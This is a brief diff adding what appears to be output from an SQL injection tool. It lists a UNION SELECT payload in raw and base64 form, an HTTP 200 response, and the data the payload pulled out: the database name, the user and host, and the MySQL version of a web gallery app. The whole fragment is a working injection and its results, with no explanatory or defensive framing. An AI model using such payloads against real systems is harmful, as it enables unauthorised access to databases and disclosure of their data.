@@ -1,0 +1,5 @@
+RAW  : "' UNION SELECT CONCAT(database(),' | ',user(),' | ',@@version_comment)-- -"
+B64  : JyBVTklPTiBTRUxFQ1QgQ09OQ0FUKGRhdGFiYXNlKCksJyB8ICcsdXNlcigpLCcgfCAnLEBAdmVyc2lvbl9jb21tZW50KS0tIC0=
+HTTP : 200 LEN=4170
+DET  : art='🖼️' h2='&#039; UNION SELECT CONCAT(database(),&#039; | &#039;,user(),&#039; | &#039;,@@version_comment)-- -' desc='critter_gallery | gallery@10.18.53.240 | MySQL Community Server - GPL<br>'
+------------------------------------------------------------------------
